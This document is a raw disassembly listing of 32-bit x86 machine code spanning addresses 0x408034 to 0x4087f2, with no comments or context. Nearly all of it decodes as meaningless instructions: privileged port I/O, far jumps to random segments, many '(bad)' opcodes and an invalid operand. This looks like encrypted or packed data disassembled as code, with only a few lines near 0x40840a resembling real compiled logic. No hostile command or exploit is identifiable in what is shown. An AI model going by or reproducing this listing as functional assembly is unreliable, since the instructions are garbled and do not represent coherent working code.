  408034:	mov    bh,0x3b
  408036:	adc    DWORD PTR [esi],0xeb6f8867
  40803c:	mul    DWORD PTR [ebp-0x2]
  40803f:	xchg   esp,eax
  408040:	or     DWORD PTR [ecx-0x606bb008],0x1d
  408047:	xor    al,BYTE PTR [ebx+edi*4]
  40804a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40804c:	retf   
  40804d:	pop    ss
  40804e:	test   DWORD PTR [esi-0x5f2ad4e9],0x89e32e6c
  408058:	jbe    0x40805a
  40805a:	cmp    eax,0x78ecd3e9
  40805f:	pop    ds
  408060:	aaa    
  408061:	sub    BYTE PTR [edx+0x2f851ad5],ch
  408067:	jmp    DWORD PTR [edx]
  408069:	xchg   esp,eax
  40806a:	adc    esi,edi
  40806c:	pop    ecx
  40806d:	adc    eax,0xf069d70e
  408072:	aaa    
  408073:	xchg   BYTE PTR [ebx+0x1be478b1],bh
  408079:	fcom   DWORD PTR [ebx]
  40807b:	fstp   QWORD PTR es:[esi-0x54]
  40807f:	mov    ebx,0xa161816e
  408084:	push   esi
  408085:	(bad)  [esi]
  408087:	dec    ecx
  408088:	unpcklps xmm5,xmm6
  40808b:	mov    ebp,0x9854669
  408090:	or     al,0xad
  408092:	jmp    0x430ddb80
  408097:	popf   
  408098:	fist   WORD PTR [edx+0xf]
  40809b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40809c:	js     0x4080ff
  40809e:	inc    edx
  40809f:	sub    ebx,ebx
  4080a1:	add    ecx,DWORD PTR [ebx+0x5b]
  4080a4:	outs   dx,DWORD PTR ds:[esi]
  4080a5:	mov    dl,0x72
  4080a7:	out    dx,eax
  4080a8:	dec    esi
  4080a9:	mov    esi,0x630ae4c4
  4080ae:	xor    BYTE PTR [ebx],0x66
  4080b1:	aaa    
  4080b2:	pop    ebp
  4080b3:	mov    esp,0xf94a98ff
  4080b8:	push   ebx
  4080b9:	pop    ecx
  4080ba:	not    DWORD PTR [eax-0x477b6194]
  4080c0:	js     0x40807e
  4080c2:	mov    esi,0x234eaff2
  4080c7:	mov    ebp,0x801913c7
  4080cc:	inc    edi
  4080cd:	out    dx,al
  4080ce:	xchg   esi,eax
  4080cf:	mov    edx,0x35772928
  4080d4:	out    0x27,al
  4080d6:	sbb    esp,DWORD PTR [ebx+0x28]
  4080d9:	rcl    DWORD PTR [ebp+eiz*8+0x443e757b],cl
  4080e0:	test   al,0xa5
  4080e2:	pop    ecx
  4080e3:	inc    edx
  4080e4:	(bad)  
  4080e5:	pop    ss
  4080e6:	sar    BYTE PTR [edx-0x4e11b81c],1
  4080ec:	ret    0x1e7
  4080ef:	push   ds
  4080f0:	jb     0x40814c
  4080f2:	cmp    ch,dh
  4080f4:	(bad)  
  4080f5:	int    0x8f
  4080f7:	mov    ebx,0x7df6d98d
  4080fc:	push   edx
  4080fd:	loop   0x40816d
  4080ff:	enter  0xe161,0x9a
  408103:	hlt    
  408104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408105:	inc    ebx
  408106:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408107:	push   ss
  408108:	and    eax,0xc54b94e
  40810d:	jne    0x40816d
  40810f:	mov    dh,0xad
  408111:	push   eax
  408112:	pop    es
  408113:	dec    edx
  408114:	fs sbb eax,eax
  408117:	arpl   WORD PTR [edi+0x707814f5],bp
  40811d:	fisubr DWORD PTR [ebx+0x1f]
  408120:	xor    eax,0x8ab3289b
  408125:	sub    DWORD PTR [ebp+0x49],0x78675b7b
  40812c:	ins    DWORD PTR es:[edi],dx
  40812d:	test   DWORD PTR [ebp+0x37061cf5],ebp
  408133:	fld    DWORD PTR [ecx]
  408135:	lock adc BYTE PTR [esi-0x27],al
  408139:	(bad)  
  40813b:	sbb    cl,0x38
  40813e:	mov    bl,0xe2
  408140:	int3   
  408141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408142:	or     DWORD PTR [ecx+0x33],0xead482a0
  408149:	mov    eax,ds:0x6c52f581
  40814e:	sbb    esi,ebp
  408150:	push   esi
  408151:	bnd ret 
  408153:	in     eax,dx
  408154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408155:	mov    bh,0x33
  408157:	es call 0x895352a0
  40815d:	dec    edi
  40815e:	xchg   edi,eax
  40815f:	addr16 mov si,0xcdb5
  408164:	dec    edi
  408165:	push   ds
  408166:	fldcw  WORD PTR [esi-0x5cf4c3cb]
  40816c:	mov    edx,0xe5fcf9a1
  408171:	xor    al,0xd6
  408173:	jl     0x408182
  408175:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408177:	push   ebx
  408178:	ror    BYTE PTR [edx+0x1a9067ad],1
  40817e:	push   0x8a9957f1
  408183:	mov    BYTE PTR [esi],ah
  408185:	sbb    eax,0xed647228
  40818a:	mov    dl,0xd9
  40818c:	and    eax,0x47dd34eb
  408191:	pop    eax
  408192:	inc    edi
  408193:	leave  
  408194:	out    dx,al
  408195:	es pop eax
  408197:	fwait
  408198:	ret    
  408199:	mov    cl,0x68
  40819b:	or     esi,esp
  40819d:	xor    edx,edi
  40819f:	jno    0x40814c
  4081a1:	ins    BYTE PTR es:[edi],dx
  4081a2:	pop    ebx
  4081a3:	and    esp,eax
  4081a5:	scas   al,BYTE PTR es:[edi]
  4081a6:	inc    esp
  4081a7:	push   esp
  4081a8:	inc    edx
  4081a9:	hlt    
  4081aa:	mov    ds:0x597b5696,al
  4081af:	cmp    DWORD PTR [edi-0x25],ecx
  4081b2:	xor    edx,DWORD PTR [eax-0x363580ec]
  4081b8:	sahf   
  4081b9:	dec    esp
  4081ba:	mov    ebx,0x8eb07fcd
  4081bf:	dec    ecx
  4081c0:	ret    
  4081c1:	(bad)  
  4081c2:	aam    0xe8
  4081c4:	mov    edx,0x956124c9
  4081c9:	xchg   ecx,eax
  4081ca:	jo     0x4081b3
  4081cc:	test   edi,0xfc953a25
  4081d2:	cmp    esi,DWORD PTR ds:0x7c6d67c5
  4081d8:	test   eax,0xa9036dd4
  4081dd:	pop    ss
  4081de:	stos   BYTE PTR es:[edi],al
  4081df:	lods   al,BYTE PTR ds:[esi]
  4081e0:	das    
  4081e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081e2:	enter  0xc0dc,0x58
  4081e6:	gs out dx,eax
  4081e8:	pop    es
  4081e9:	outs   dx,BYTE PTR ds:[esi]
  4081ea:	pop    ecx
  4081eb:	sub    eax,0x966e8c25
  4081f0:	les    esp,FWORD PTR [edx-0x1a8047ac]
  4081f6:	dec    ebp
  4081f7:	sub    eax,0xd4e8214d
  4081fc:	inc    ebp
  4081fd:	mov    al,ds:0xdba53d47
  408202:	mov    dl,0x77
  408204:	push   ecx
  408205:	mov    ebx,0xe877115d
  40820a:	pop    esi
  40820b:	jns    0x4081cf
  40820d:	pop    ebx
  40820e:	mov    esp,0x48cfa74f
  408213:	add    bh,BYTE PTR [esi]
  408215:	or     al,0xcf
  408217:	ins    BYTE PTR es:[edi],dx
  408218:	xor    dl,BYTE PTR [esp+edi*1-0x6b66b02a]
  40821f:	jbe    0x408212
  408221:	pop    es
  408222:	imul   esi
  408224:	rcl    DWORD PTR [edi],1
  408226:	int3   
  408227:	mov    edx,ds
  408229:	cmp    BYTE PTR ds:0xc2e3ecb2,0x3a
  408230:	(bad)  
  408232:	mov    ah,0xff
  408234:	test   eax,0xdef4c2d3
  408239:	fmulp  st(6),st
  40823b:	aas    
  40823c:	mov    ah,BYTE PTR [edi]
  40823e:	into   
  40823f:	dec    ecx
  408240:	dec    edi
  408241:	jmp    0xffdb:0xc0b9d57c
  408248:	sbb    dl,cl
  40824a:	arpl   WORD PTR [edi-0x2f841fdb],di
  408250:	xor    BYTE PTR [edi-0x15],ah
  408253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408254:	ret    
  408255:	test   BYTE PTR [ecx-0x2c4e6d50],bl
  40825b:	xlat   BYTE PTR ds:[ebx]
  40825c:	in     al,dx
  40825d:	(bad)  
  40825e:	mov    cl,0x88
  408260:	adc    al,0x37
  408262:	cmp    DWORD PTR [bp-0x2ed5],esi
  408267:	mov    esp,0x5f75baa6
  40826c:	scas   eax,DWORD PTR es:[edi]
  40826d:	div    DWORD PTR [edx]
  40826f:	fild   WORD PTR [esi+0x31416d99]
  408275:	retf   
  408276:	aad    0xe2
  408278:	mov    ds:0xb4a32b69,al
  40827d:	push   esi
  40827e:	test   al,0x5e
  408280:	pop    ebp
  408281:	mov    edi,DWORD PTR [esi+ebp*4]
  408284:	xchg   dh,dl
  408286:	xchg   edi,eax
  408287:	and    eax,0xefb126bd
  40828c:	in     al,0x16
  40828e:	inc    eax
  40828f:	xchg   BYTE PTR [edi+ebx*8+0x5904e708],al
  408296:	inc    ebp
  408297:	inc    ebp
  408298:	test   al,0x9e
  40829a:	lds    edx,FWORD PTR [eax+ecx*8-0x25]
  40829e:	leave  
  40829f:	or     BYTE PTR [ecx],ch
  4082a1:	outs   dx,BYTE PTR ds:[esi]
  4082a2:	in     al,0x29
  4082a4:	mov    ds:0xfcfdfabe,al
  4082a9:	ins    BYTE PTR es:[edi],dx
  4082aa:	push   esp
  4082ab:	gs daa 
  4082ad:	aam    0xf9
  4082af:	mov    edx,0x9c08f4fb
  4082b4:	std    
  4082b5:	pop    edx
  4082b6:	loope  0x4082a5
  4082b8:	(bad)  
  4082b9:	pop    ebx
  4082ba:	or     eax,0x572a2aca
  4082bf:	popf   
  4082c0:	xor    BYTE PTR [ecx-0x7f6a5f07],dl
  4082c6:	push   esi
  4082c7:	jnp    0x408320
  4082c9:	dec    edx
  4082ca:	mov    eax,0xebfc1da7
  4082cf:	mov    ch,0x37
  4082d1:	ud2    
  4082d3:	inc    esp
  4082d4:	push   cs
  4082d5:	inc    edi
  4082d6:	es out dx,eax
  4082d8:	pop    ebp
  4082d9:	mov    WORD PTR [edi-0x6a024346],es
  4082df:	mov    fs,esi
  4082e1:	call   0x5f0a:0x82a0cb7a
  4082e8:	xchg   edx,eax
  4082e9:	or     DWORD PTR [edx-0x67],ebx
  4082ec:	(bad)  
  4082ed:	cld    
  4082ee:	or     DWORD PTR cs:[edi+0x46],esp
  4082f2:	loope  0x40829b
  4082f4:	xlat   BYTE PTR ds:[ebx]
  4082f5:	(bad)  
  4082f6:	repz cmp ebp,DWORD PTR ds:[edx+0x23]
  4082fb:	popa   
  4082fc:	scas   eax,DWORD PTR es:[edi]
  4082fd:	iret   
  4082fe:	dec    ebp
  4082ff:	and    ah,BYTE PTR [edi+0x424ce8ae]
  408305:	(bad)  
  408306:	adc    eax,eax
  408308:	pop    ebp
  408309:	mov    edx,0x38c9ef9e
  40830e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40830f:	out    0xcb,eax
  408311:	jns    0x4082d8
  408313:	jp     0x40832e
  408315:	int3   
  408316:	into   
  408317:	sbb    al,0x44
  40831a:	test   DWORD PTR [edx+0x34],0xfcec42be
  408321:	rcr    BYTE PTR [edi-0x6f],0x64
  408325:	pushf  
  408326:	xchg   BYTE PTR [ebx-0x4aa1f533],dl
  40832c:	xchg   esp,eax
  40832d:	xchg   dh,bl
  40832f:	xchg   BYTE PTR [eax],bl
  408331:	mov    edx,edi
  408333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408334:	test   eax,0xabb741a3
  408339:	push   cs
  40833a:	test   al,0xe2
  40833c:	fsub   st,st(4)
  40833e:	xchg   al,bh
  408340:	cdq    
  408341:	push   ebp
  408342:	pop    esp
  408343:	cs out 0x1f,al
  408346:	adc    esp,DWORD PTR [ebx+edi*4-0x1411efb]
  40834d:	xchg   BYTE PTR [eax-0x56],al
  408350:	mov    edi,0x29c48a83
  408355:	mov    ah,BYTE PTR [ebp-0x37dc2bcc]
  40835b:	inc    eax
  40835c:	mov    bh,0x83
  40835e:	and    al,0x6f
  408360:	in     al,0xb5
  408362:	adc    eax,0xfe0736d8
  408367:	mov    ds:0x943df100,al
  40836c:	cmp    DWORD PTR [ebp+0x3569269c],ecx
  408372:	jnp    0x40838c
  408374:	pop    ds
  408375:	mov    bh,cl
  408377:	mov    edx,0x955b8ec1
  40837c:	mov    al,ds:0x13023810
  408381:	cli    
  408382:	mov    cl,0x63
  408384:	inc    edx
  408385:	mov    eax,ds:0x83f57bd3
  40838a:	mov    eax,ss
  40838c:	xor    al,0xb2
  40838e:	shr    DWORD PTR [ebx+0x38],cl
  408391:	sub    DWORD PTR [esi],edx
  408393:	addr16 add bh,dh
  408396:	int    0xf6
  408398:	inc    ebp
  408399:	pop    eax
  40839a:	xor    DWORD PTR [eax+0x6451ebc7],0x46
  4083a1:	push   0xb2ef1f0c
  4083a6:	add    DWORD PTR [esi],ebp
  4083a8:	imul   edi,edi,0x844dd4ba
  4083ae:	adc    bl,BYTE PTR [esi-0x73]
  4083b1:	sbb    dl,BYTE PTR [ecx+0x2f]
  4083b4:	add    DWORD PTR [edi-0x1bbec1b1],ebp
  4083ba:	pop    ds
  4083bb:	fst    QWORD PTR [edi-0x2c42eff1]
  4083c1:	cmp    ah,BYTE PTR [edx+0x1b]
  4083c4:	jp     0x408407
  4083c6:	pop    eax
  4083c7:	das    
  4083c8:	adc    DWORD PTR [ebx],0xffffff84
  4083cb:	(bad)  
  4083ce:	mov    BYTE PTR [edx],0xf0
  4083d1:	push   ss
  4083d2:	imul   eax,ebx,0x43fe11f7
  4083d8:	dec    edi
  4083d9:	popa   
  4083da:	push   ss
  4083db:	nop
  4083dc:	mov    BYTE PTR [edi],cl
  4083de:	pop    ebx
  4083df:	cmc    
  4083e0:	cli    
  4083e1:	xchg   DWORD PTR [esi-0x73075e0c],eax
  4083e7:	int3   
  4083e8:	mov    ds:0x5b077ffc,al
  4083ed:	cmp    dh,BYTE PTR gs:[edi-0xb]
  4083f1:	mov    dl,0x4
  4083f3:	test   BYTE PTR [esi+0x4e],0xa1
  4083f7:	or     ch,BYTE PTR [ebx+eax*4+0x42]
  4083fb:	cmp    ebx,edx
  4083fd:	dec    ebx
  4083fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083ff:	sub    ecx,ebx
  408401:	data16 scas al,BYTE PTR es:[edi]
  408403:	ret    0xea0e
  408406:	repz test al,0xb4
  408409:	std    
  40840a:	mov    edx,DWORD PTR [ebp-0x8]
  40840d:	mov    al,BYTE PTR [eax+edx*1]
  408410:	mov    BYTE PTR [ebp-0x1],al
  408413:	mov    eax,DWORD PTR [ebp-0x30]
  408416:	jmp    0x40a7b9
  40841b:	and    al,0x5f
  40841d:	not    BYTE PTR [ebp+eax*4+0x62cf048b]
  408424:	xchg   ecx,eax
  408425:	dec    edi
  408426:	in     eax,dx
  408427:	push   es
  408428:	jb     0x40841a
  40842a:	das    
  40842b:	call   0xfcbafe40
  408430:	pop    edi
  408431:	jp     0x4084ad
  408433:	int3   
  408434:	inc    ebx
  408435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408436:	push   ecx
  408437:	cmp    al,0xdf
  408439:	test   eax,0xdd199877
  40843e:	jl     0x40848c
  408440:	push   cs
  408441:	or     al,0xcd
  408443:	lds    esp,FWORD PTR [ecx]
  408445:	loope  0x40840a
  408447:	xchg   esi,eax
  408448:	mov    ebp,0x7d6b1134
  40844d:	ror    DWORD PTR [esp+eiz*8],cl
  408450:	and    BYTE PTR ds:0xea2b2a00,cl
  408456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408457:	call   0x7079:0x9af04b00
  40845e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40845f:	add    ecx,edi
  408461:	mov    ebp,0x881d2f49
  408466:	inc    ecx
  408467:	(bad)  
  408468:	xor    ebx,ebx
  40846a:	ins    DWORD PTR es:[edi],dx
  40846b:	aam    0xa3
  40846d:	push   ds
  40846e:	or     DWORD PTR [edi],edx
  408470:	dec    esp
  408471:	out    0xe5,al
  408473:	mov    al,ds:0x1eb4b8c7
  408478:	inc    edi
  408479:	call   0xd6b:0xe0201745
  408480:	and    al,BYTE PTR ds:0x71370a98
  408486:	lods   al,BYTE PTR ds:[esi]
  408487:	mov    ch,0xb8
  408489:	ins    BYTE PTR es:[edi],dx
  40848a:	ficomp DWORD PTR [ebp-0x2017e5f5]
  408490:	outs   dx,DWORD PTR ds:[esi]
  408491:	lods   eax,DWORD PTR ds:[esi]
  408492:	ja     0x4084c5
  408494:	dec    ecx
  408495:	push   DWORD PTR [ebp+edx*1+0x232cd1ed]
  40849c:	je     0x408502
  40849e:	dec    ecx
  40849f:	jmp    0x98da:0xd14de4ca
  4084a6:	mov    eax,0xadb64fe3
  4084ab:	mov    ?,eax
  4084ad:	inc    eax
  4084ae:	aaa    
  4084af:	std    
  4084b0:	fs (bad) 
  4084b2:	test   ch,0x38
  4084b5:	push   ss
  4084b6:	scas   eax,DWORD PTR es:[edi]
  4084b7:	rcr    ch,1
  4084b9:	(bad)  
  4084ba:	stos   BYTE PTR es:[edi],al
  4084bb:	in     eax,0x69
  4084bd:	cs xor al,0x1b
  4084c0:	pop    ds
  4084c1:	fidiv  DWORD PTR [edx-0x33]
  4084c4:	sub    edx,ecx
  4084c6:	(bad)  
  4084c8:	ds dec ebp
  4084ca:	sar    bl,0x51
  4084cd:	bound  ebx,QWORD PTR [edi]
  4084cf:	push   cs
  4084d0:	mov    bh,0x2
  4084d2:	(bad)  
  4084d3:	sub    esi,DWORD PTR [edi]
  4084d5:	or     BYTE PTR [ecx],0xe7
  4084d8:	mov    esp,0x6e1ccc87
  4084dd:	icebp  
  4084de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084df:	fcmovnu st,st(5)
  4084e1:	nop
  4084e2:	mov    DWORD PTR [edx],esi
  4084e4:	hlt    
  4084e5:	clc    
  4084e6:	mov    ebp,0xb583583f
  4084eb:	sub    ch,BYTE PTR [esi+eiz*1+0x301efafa]
  4084f2:	push   eax
  4084f3:	fiadd  WORD PTR [eax-0x2c]
  4084f6:	test   eax,0x7a4abacc
  4084fb:	jle    0x40856c
  4084fd:	(bad)  
  4084fe:	retf   0x3501
  408501:	leave  
  408502:	xlat   BYTE PTR ds:[ebx]
  408503:	push   cs
  408504:	bound  eax,QWORD PTR [esi-0x2b628c6]
  40850a:	popf   
  40850b:	out    0xd6,al
  40850d:	inc    ebp
  40850e:	sub    al,0x96
  408510:	mov    DWORD PTR [edx],ebp
  408512:	mov    esi,0xb31047d2
  408517:	pushf  
  408518:	and    al,0x2a
  40851a:	adc    BYTE PTR [edi+ebx*8],dl
  40851d:	in     eax,0x7a
  40851f:	sub    ch,BYTE PTR [ebx+eiz*8]
  408522:	and    al,0xd7
  408525:	pop    ss
  408526:	stos   DWORD PTR es:[edi],eax
  408527:	int3   
  408528:	loopne 0x40857e
  40852a:	shl    bh,cl
  40852c:	in     eax,dx
  40852d:	jmp    0x408508
  40852f:	retf   
  408530:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408532:	add    bh,BYTE PTR [eax-0x34]
  408535:	cld    
  408536:	outs   dx,DWORD PTR ds:[esi]
  408537:	(bad)  
  408539:	loope  0x40857a
  40853b:	add    ebp,DWORD PTR [eax]
  40853d:	in     al,0x1c
  40853f:	mov    eax,ds:0x3d94463b
  408544:	xchg   esp,eax
  408545:	mov    ecx,0xb6c29c34
  40854a:	aam    0xb8
  40854c:	sub    al,dl
  40854e:	mov    ah,dh
  408550:	out    0x43,al
  408552:	popa   
  408553:	pop    ss
  408554:	jo     0x408552
  408556:	push   0x2
  408558:	and    eax,0xf16c24d5
  40855d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40855e:	icebp  
  40855f:	inc    eax
  408560:	pop    ebp
  408561:	mov    cl,0x65
  408563:	adc    al,BYTE PTR [edi-0x6cc964f2]
  408569:	pusha  
  40856a:	pop    ebp
  40856b:	fld    TBYTE PTR [esi-0x66]
  40856e:	dec    eax
  40856f:	mov    dl,0x7e
  408571:	daa    
  408572:	jne    0x4085a2
  408574:	xchg   edx,eax
  408575:	mov    dl,0xff
  408577:	jg     0x4085a4
  408579:	pop    ds
  40857a:	mov    dl,0xae
  40857c:	adc    DWORD PTR [ebx-0x64880f58],ebx
  408582:	or     al,0xe5
  408584:	jo     0x408544
  408586:	fwait
  408587:	sbb    BYTE PTR [ebp+0x74],al
  40858a:	sbb    edi,DWORD PTR [edi-0x42]
  40858d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40858e:	pop    ss
  40858f:	lea    edx,[bx+di-0x44]
  408593:	sub    al,0xdd
  408595:	js     0x40858d
  408597:	adc    DWORD PTR [edi-0x2b593edf],esi
  40859d:	data16 repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085a0:	jl     0x408582
  4085a2:	es mov esp,0x7d9e9b71
  4085a8:	and    ecx,ecx
  4085aa:	push   ecx
  4085ab:	shl    dh,0x3d
  4085ae:	jge    0x40856b
  4085b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085b1:	push   edi
  4085b2:	and    ebx,edi
  4085b4:	add    edi,esp
  4085b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085b7:	out    dx,al
  4085b8:	cs jno 0x408579
  4085bb:	jmp    0x408606
  4085bd:	stos   DWORD PTR es:[edi],eax
  4085be:	push   ecx
  4085bf:	cmp    ecx,esp
  4085c1:	jbe    0x4085e2
  4085c3:	mov    esi,0x69b36ce2
  4085c8:	into   
  4085c9:	rol    DWORD PTR [eax],0xe5
  4085cc:	mov    esi,0xbf0e6e5a
  4085d1:	push   ebp
  4085d2:	pusha  
  4085d3:	aas    
  4085d4:	jg     0x408598
  4085d6:	out    dx,al
  4085d7:	test   DWORD PTR [ecx+0x47],eax
  4085da:	das    
  4085db:	mov    ebp,0x9b240bca
  4085e0:	dec    esi
  4085e1:	fwait
  4085e2:	xor    eax,0xbdfe631d
  4085e7:	stos   BYTE PTR es:[edi],al
  4085e8:	adc    al,0x28
  4085ea:	inc    ecx
  4085eb:	pop    ss
  4085ec:	mov    bl,0x5b
  4085ee:	sahf   
  4085ef:	or     al,0x97
  4085f1:	jecxz  0x408600
  4085f3:	xchg   ebp,eax
  4085f4:	adc    esi,DWORD PTR [esi]
  4085f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085f7:	xlat   BYTE PTR ds:[ebx]
  4085f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085f9:	scas   eax,DWORD PTR es:[edi]
  4085fa:	fdiv   QWORD PTR [ebx+0x65]
  4085fd:	data16 adc bh,ch
  408600:	les    edx,FWORD PTR [esi]
  408602:	fisub  WORD PTR [edx-0x7fed4de7]
  408608:	mov    ebp,0x5bd69b47
  40860d:	fs inc ebp
  40860f:	adc    bh,cl
  408611:	jnp    0x4085a9
  408613:	add    BYTE PTR [ebp+esi*4+0x79a9a69a],bl
  40861a:	call   0xf394104f
  40861f:	ins    DWORD PTR es:[edi],dx
  408620:	jg     0x40866a
  408622:	jno    0x408689
  408624:	xchg   ebx,eax
  408625:	clc    
  408626:	into   
  408627:	shr    cl,1
  408629:	aad    0x40
  40862b:	jle    0x408693
  40862d:	add    eax,0xe352d845
  408632:	xor    eax,0xb277d417
  408637:	enter  0x90ec,0x9a
  40863b:	xchg   DWORD PTR [ecx],esi
  40863d:	stc    
  40863e:	jns    0x408641
  408640:	jle    0x40868e
  408642:	sbb    cl,BYTE PTR [edx-0x395542aa]
  408648:	out    dx,eax
  408649:	pop    es
  40864a:	mov    WORD PTR [edi],es
  40864c:	sub    BYTE PTR [edi],dh
  40864e:	ss out dx,al
  408650:	lods   al,BYTE PTR ds:[esi]
  408651:	scas   al,BYTE PTR es:[edi]
  408652:	cmp    DWORD PTR [eax+0x1220d35f],0x15ee856f
  40865c:	adc    BYTE PTR [eax],cl
  40865e:	mov    eax,ds:0xd28a1b82
  408663:	(bad)  
  408664:	les    edi,FWORD PTR [ebx]
  408666:	sbb    al,0x83
  408668:	scas   al,BYTE PTR es:[edi]
  408669:	push   0x7a66c635
  40866e:	je     0x4085f9
  408670:	mov    ds:0x5a91e6fa,al
  408675:	xlat   BYTE PTR ds:[ebx]
  408676:	daa    
  408677:	ds dec eax
  408679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40867a:	arpl   bx,sp
  40867c:	lds    ebx,FWORD PTR [ebx]
  40867e:	mov    esp,0x5bb3f28d
  408683:	jae    0x408645
  408685:	cmp    esi,DWORD PTR [ebx+0x13f2325a]
  40868b:	fadd   st,st(4)
  40868d:	jb     0x4086df
  40868f:	mov    ebp,0x1a55339e
  408694:	ret    0xe1c7
  408697:	or     DWORD PTR [ebp+0x11],esi
  40869a:	sbb    DWORD PTR [edi],ecx
  40869c:	pop    es
  40869d:	xor    dh,BYTE PTR [edi-0x71]
  4086a0:	adc    al,0x82
  4086a2:	jmp    0x4086fd
  4086a4:	sub    al,0xb6
  4086a6:	sub    eax,0xdb9387ee
  4086ab:	jp     0x40865e
  4086ad:	(bad)  
  4086ae:	jg     0x4086a1
  4086b0:	push   ss
  4086b1:	mov    ah,0x20
  4086b3:	jmp    0x4086a7
  4086b5:	lods   al,BYTE PTR ds:[esi]
  4086b6:	imul   eax,DWORD PTR [ecx-0xf],0xffffff93
  4086ba:	int    0xf
  4086bc:	and    eax,0x26dd5572
  4086c1:	and    ebx,DWORD PTR [edx-0x5e]
  4086c4:	jecxz  0x4086c2
  4086c6:	test   eax,0x68b41292
  4086cb:	sub    eax,0xa4abe1bc
  4086d0:	jmp    0xa12e:0x63d2b5f7
  4086d7:	xor    ebx,DWORD PTR [esi]
  4086d9:	je     0x408713
  4086db:	aad    0x1b
  4086dd:	fimul  DWORD PTR [ecx+0x1f]
  4086e0:	sbb    BYTE PTR [esi],al
  4086e2:	mov    edx,0x755af2d8
  4086e7:	call   0xa0a9eb27
  4086ec:	jmp    0x1f9d:0xce02fe2d
  4086f3:	test   bh,ch
  4086f5:	ins    BYTE PTR es:[edi],dx
  4086f6:	inc    edx
  4086f7:	call   FWORD PTR [esp+edx*4-0x76b33b4f]
  4086fe:	dec    eax
  4086ff:	cmp    dl,BYTE PTR [edx]
  408701:	fild   QWORD PTR [eax-0x23]
  408704:	inc    edi
  408705:	mov    al,ds:0xc71f1f97
  40870a:	lds    ecx,FWORD PTR [esi-0x53]
  40870d:	jno    0x40872a
  40870f:	push   ebx
  408710:	in     eax,0xa7
  408712:	lds    esp,FWORD PTR [esp+esi*4-0x15]
  408716:	jb     0x408771
  408718:	xchg   edx,eax
  408719:	xor    al,0x12
  40871b:	jbe    0x4086ac
  40871d:	ds loopne 0x4086ac
  408720:	inc    esp
  408721:	ja     0x4086b2
  408723:	or     al,0xfa
  408725:	and    eax,0x697d1587
  40872a:	lods   eax,DWORD PTR ds:[esi]
  40872b:	test   eax,0xa59c1087
  408730:	and    al,0x6a
  408732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408733:	call   0x6b2f:0x87e6cc4a
  40873a:	stos   DWORD PTR es:[edi],eax
  40873b:	mov    ch,0x7b
  40873d:	out    0x5b,al
  40873f:	sbb    bh,BYTE PTR [esi-0xe]
  408742:	xor    BYTE PTR [esi],al
  408744:	adc    eax,0xff4c22e7
  408749:	fistp  DWORD PTR [edx-0x3beffbb5]
  40874f:	(bad)  
  408750:	cli    
  408751:	add    al,0xe
  408753:	das    
  408754:	jmp    0x40877b
  408756:	call   0xf5c:0x1cd95b1a
  40875d:	cmc    
  40875e:	popa   
  40875f:	fwait
  408760:	sub    ah,BYTE PTR [edi]
  408762:	cmp    al,0x4
  408764:	outs   dx,BYTE PTR ds:[esi]
  408765:	ins    DWORD PTR es:[edi],dx
  408766:	loope  0x408728
  408768:	or     esi,esp
  40876a:	mov    esp,0x4f53b2ec
  40876f:	add    DWORD PTR [ecx+0x554bebc3],ebp
  408775:	push   0x66ba3aca
  40877a:	mov    ebp,edi
  40877c:	mov    cl,0xd0
  40877e:	ins    BYTE PTR es:[edi],dx
  40877f:	xchg   ebp,eax
  408780:	imul   ebp,DWORD PTR [edi-0x190058f3],0x7c
  408787:	and    eax,0x3feaa8fc
  40878c:	xor    ecx,DWORD PTR ds:0x9d6cd48c
  408792:	nop
  408793:	sbb    ch,bh
  408795:	adc    dh,BYTE PTR [eax+0x4f]
  408798:	les    eax,FWORD PTR [ecx-0x7365cf82]
  40879e:	xchg   ebp,eax
  40879f:	pop    edi
  4087a0:	icebp  
  4087a1:	mov    cl,0xdb
  4087a3:	mov    cs:0xc8f0db28,al
  4087a9:	mov    al,ds:0x42e35ebd
  4087ae:	(bad)  
  4087af:	xor    DWORD PTR [edi+ebp*4+0x17106a11],ebp
  4087b6:	pop    esi
  4087b7:	add    BYTE PTR [ecx-0x42],ah
  4087ba:	int3   
  4087bb:	xchg   edi,eax
  4087bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087bd:	daa    
  4087be:	out    0x6a,eax
  4087c0:	sti    
  4087c1:	mov    eax,0xcd6c68e1
  4087c6:	lock mov eax,0x1e9e7520
  4087cc:	and    BYTE PTR [ebx-0x32],0x16
  4087d0:	add    al,0xb8
  4087d2:	cmp    eax,DWORD PTR [edi-0x4d]
  4087d5:	bound  eax,QWORD PTR ds:0xf445d6b1
  4087db:	pop    ecx
  4087dc:	hlt    
  4087dd:	nop
  4087de:	fisttp WORD PTR [edi-0x70]
  4087e1:	jmp    0x997cf6de
  4087e6:	xor    BYTE PTR [edx+0x72c7717b],al
  4087ec:	out    dx,eax
  4087ed:	cli    
  4087ee:	(bad)  
  4087ef:	pop    edi
  4087f0:	and    BYTE PTR [esi],ch
  4087f2:	inc    ecx
